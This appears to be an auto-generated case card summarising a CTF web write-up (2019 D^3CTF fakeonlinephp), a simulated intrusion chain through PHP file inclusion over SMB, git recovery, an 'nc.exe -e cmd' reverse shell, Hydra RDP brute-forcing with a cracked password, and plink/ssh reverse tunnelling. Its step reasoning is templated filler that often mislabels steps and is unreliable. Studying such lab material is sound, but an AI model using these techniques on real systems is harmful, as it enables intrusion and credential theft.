# 2019 D^3CTF_wp：fakeonlinephp解法（类实网渗透）_Smity(Liu)的博客-CSDN博客

## Case Metadata

- Category: `Web`
- Platform: `2019 D^3CTF`
- Difficulty: `unknown`
- Source repository: `https://github.com/apachecn/apachecn-ctf-wiki`
- Source commit: `762ca130572c95196cf120e5f4ad5fbdd88b1b93`
- Source file: `docs/2019-D^3CTF_wp：fakeonlinephp解法（类实网渗透）_Smity(Liu)的博客-CSDN博客.md`
- Source URL: `https://github.com/apachecn/apachecn-ctf-wiki/blob/762ca130572c95196cf120e5f4ad5fbdd88b1b93/docs/2019-D%5E3CTF_wp%EF%BC%9Afakeonlinephp%E8%A7%A3%E6%B3%95%EF%BC%88%E7%B1%BB%E5%AE%9E%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%89_Smity%28Liu%29%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2.md`
- Local source mirror: `sources/apachecn-apachecn-ctf-wiki/repo/docs/2019-D^3CTF_wp：fakeonlinephp解法（类实网渗透）_Smity(Liu)的博客-CSDN博客.md`

## Why This Case Matters

Use this case as a Web reference for web-app challenges.

## Input Signals

- Artifacts: web-app
- Tools: detect-it-easy, hydra, netcat
- Techniques: command-injection, dns-analysis, file-inclusion, http-analysis, misc-analysis, password-cracking, service-enumeration, web-exploitation

## First-Principles Route

- Identify the exposed entry point, reflected behavior, trust boundary, and any explicit hints or blacklists.
- Validate the suspected primitive with the smallest payload that proves code/data/control influence.
- Chain the primitive into file read, code execution, auth bypass, or state manipulation only after recording the bypass condition.

## Linked Assets

- Referenced assets: `27`
- `docs/img/625f0a9135320cc4e70de7f14cbb9a51.png`
- `docs/img/09a11b298b146d9e83f4429e964579a1.png`
- `docs/img/a448b09d2de73a4cb1b8c18e83e162af.png`
- `docs/img/59d1418206dc91afe8129f4058d7578a.png`
- `docs/img/fe8c020c26c327d6f1978f45e5bb40fb.png`
- `docs/img/686872d5651dcb360c3aca5b176053f7.png`
- `docs/img/8e1d5a15419692122cf90f9644c15025.png`
- `docs/img/3a088a0c4cf707ea3c7f3d82151929d6.png`
- `docs/img/24b6691e6b72a41589680bfd9ae0e8b7.png`
- `docs/img/f5baae4fec6fb0f27cddf5423421f130.png`
- `docs/img/047d51f0cd6c541513802ade0f8874d0.png`
- `docs/img/676d789ff8f4ab4989be7f4f491957c4.png`
- ... and `15` more

## Solve Thinking

### Step 1: Document

- Route type: `detect-it-easy-driven evidence lookup`
- Why: For Web, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use detect-it-easy, hydra, netcat to collect the smallest evidence slice that answers the goal.
- Tools: detect-it-easy, hydra, netcat
- Reasoning chain:
  - Recognize the section as detect-it-easy-driven evidence lookup.
  - Use detect-it-easy, hydra, netcat to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `-->`

### Step 2: 2019 D^3CTF_wp：fakeonlinephp解法（类实网渗透）_Smity(Liu)的博客-CSDN博客

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use detect-it-easy, hydra, netcat to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: detect-it-easy, hydra, netcat
- Reasoning chain:
  - Recognize the section as http evidence extraction.
  - Use detect-it-easy, hydra, netcat to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `> 来源：[https://blog.csdn.net/m0_37871444/article/details/103234503](https://blog.csdn.net/m0_37871444/article/details/103234503)`

### Step 3: 外网渗透部分

- Route type: `file inclusion exploitation`
- Why: Inclusion cases usually start with path control and end with wrapper, traversal, or source disclosure pivots.
- Probe: Use netcat with the extracted filter/query `<?php ($_=@$_GET['orange']) && @substr(file($_)[0],0,6) === '@<?php' ? include($_) : highlight_file(__FILE__);` and inspect the matching evidence.
- Tools: netcat
- Filters or commands:
  - `<?php ($_=@$_GET['orange']) && @substr(file($_)[0],0,6) === '@<?php' ? include($_) : highlight_file(__FILE__);`
- Reasoning chain:
  - Recognize the section as file inclusion exploitation.
  - Use netcat with the extracted filter/query `<?php ($_=@$_GET['orange']) && @substr(file($_)[0],0,6) === '@<?php' ? include($_) : highlight_file(__FILE__);` and inspect the matching evidence.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `625f0a9135320cc4e70de7f14cbb9a51`

### Step 4: smb协议利用导致远程文件包含

- Route type: `file inclusion exploitation`
- Why: Inclusion cases usually start with path control and end with wrapper, traversal, or source disclosure pivots.
- Probe: Use netcat to verify controllable include/read paths and then test the shortest local or wrapper-based read primitive.
- Tools: netcat
- Reasoning chain:
  - Recognize the section as file inclusion exploitation.
  - Use netcat to verify controllable include/read paths and then test the shortest local or wrapper-based read primitive.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `09a11b298b146d9e83f4429e964579a1`

### Step 5: 继续分析

- Route type: `detect-it-easy-driven evidence lookup`
- Why: For Web, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use detect-it-easy to collect the smallest evidence slice that answers the goal.
- Tools: detect-it-easy
- Reasoning chain:
  - Recognize the section as detect-it-easy-driven evidence lookup.
  - Use detect-it-easy to collect the smallest evidence slice that answers the goal.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `59d1418206dc91afe8129f4058d7578a`

### Step 6: 恢复git

- Route type: `command execution path`
- Why: Command execution routes should separate syntax proof, filter bypass, and final file-read or shell step.
- Probe: Use netcat to verify command execution or shell expansion with a tiny proof command before reading the target file.
- Tools: netcat
- Reasoning chain:
  - Recognize the section as command execution path.
  - Use netcat to verify command execution or shell expansion with a tiny proof command before reading the target file.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `3a088a0c4cf707ea3c7f3d82151929d6`

### Step 7: 网络拓扑

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use hydra, netcat with the extracted filter/query `nc.exe -e cmd 反弹shell` and inspect the matching evidence.
- Tools: hydra, netcat
- Filters or commands:
  - `nc.exe -e cmd 反弹shell`
- Reasoning chain:
  - Recognize the section as dns pivot.
  - Use hydra, netcat with the extracted filter/query `nc.exe -e cmd 反弹shell` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `172.19.97.8`

### Step 8: hydra爆破

- Route type: `credential discovery`
- Why: When a capture or logs mention a cleartext protocol, check credentials and followed streams before expensive analysis.
- Probe: Use hydra with the extracted filter/query `Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-23 15:51:02` and inspect the matching evidence.
- Tools: hydra
- Filters or commands:
  - `Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-23 15:51:02`
  - `Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.`
  - `Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-23 22:13:23`
  - `Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-11-23 22:40:06`
- Reasoning chain:
  - Recognize the section as credential discovery.
  - Use hydra with the extracted filter/query `Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-23 15:51:02` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `所以这个远桌面的连接密码是eDHU27TlY6ugslV`

### Step 9: 进入远程桌面

- Route type: `detect-it-easy-driven evidence lookup`
- Why: For Web, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use detect-it-easy, hydra, netcat to collect the smallest evidence slice that answers the goal.
- Tools: detect-it-easy, hydra, netcat
- Reasoning chain:
  - Recognize the section as detect-it-easy-driven evidence lookup.
  - Use detect-it-easy, hydra, netcat to collect the smallest evidence slice that answers the goal.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `3d29dba0090fd7447c2d7daab8b79b4a`

### Step 10: plink内网穿透端口转发

- Route type: `credential discovery`
- Why: When a capture or logs mention a cleartext protocol, check credentials and followed streams before expensive analysis.
- Probe: Use detect-it-easy, hydra, netcat to inspect credentials, authentication fields, or followed streams before deeper analysis.
- Tools: detect-it-easy, hydra, netcat
- Reasoning chain:
  - Recognize the section as credential discovery.
  - Use detect-it-easy, hydra, netcat to inspect credentials, authentication fields, or followed streams before deeper analysis.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `0.0.0.0:12345`

### Step 11: ssh内网穿透端口转发

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use detect-it-easy, hydra, netcat with the extracted filter/query `ssh -fqNR 0.0.0.0:公网端口:内网ip:内网端口 root@公网ip` and inspect the matching evidence.
- Tools: detect-it-easy, hydra, netcat
- Filters or commands:
  - `ssh -fqNR 0.0.0.0:公网端口:内网ip:内网端口 root@公网ip`
- Reasoning chain:
  - Recognize the section as http evidence extraction.
  - Use detect-it-easy, hydra, netcat with the extracted filter/query `ssh -fqNR 0.0.0.0:公网端口:内网ip:内网端口 root@公网ip` and inspect the matching evidence.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `0.0.0.0`

## Reuse Checklist

- Match the new challenge's artifact and question shape against this case before copying any tool sequence.
- Start from the same evidence class, then adapt filters, fields, and timestamps to the new artifact.
- Promote any repeated manual action into a skill command before relying on it for the final solve.
